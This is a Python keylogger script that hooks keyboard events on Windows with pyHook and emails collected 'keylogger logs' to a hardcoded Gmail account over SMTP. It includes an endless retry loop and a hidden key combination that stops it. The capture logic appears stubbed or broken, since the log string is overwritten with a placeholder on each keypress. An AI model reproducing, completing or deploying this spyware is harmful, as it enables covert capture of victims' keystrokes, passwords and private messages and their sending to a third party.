import smtplib, time
import pythoncom, pyHook
from pyHook import GetKeyState, HookConstants

strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnStop = "False"

def OnKeyboardEvent(event):
    global strLogs

    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
        try:
            if blnStop == "True":
                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            else:
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            strMessage = strDateTime + "\n\n" + strLogs
            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)

            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            SmtpServer.ehlo()   # identifies you to the smtp server
            SmtpServer.login(strEmailAc, strEmailPass)
            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
        except:
            time.sleep(5)   # freeze program for 5 seconds to try again
            SendMessages(strLogs, strEmailAc, strEmailPass, blnStop)

    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
        # CTRL-RIGHT_SHIFT-H to stop the program
        hooks_manager.UnhookKeyboard()
        SendMessages(strLogs, strEmailAc, strEmailPass, "True")
        exit()

    strLogs = "aaaaaa"

    if len(strLogs) >= 1000:
        SendMessages(strLogs, strEmailAc, strEmailPass, blnStop)

    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
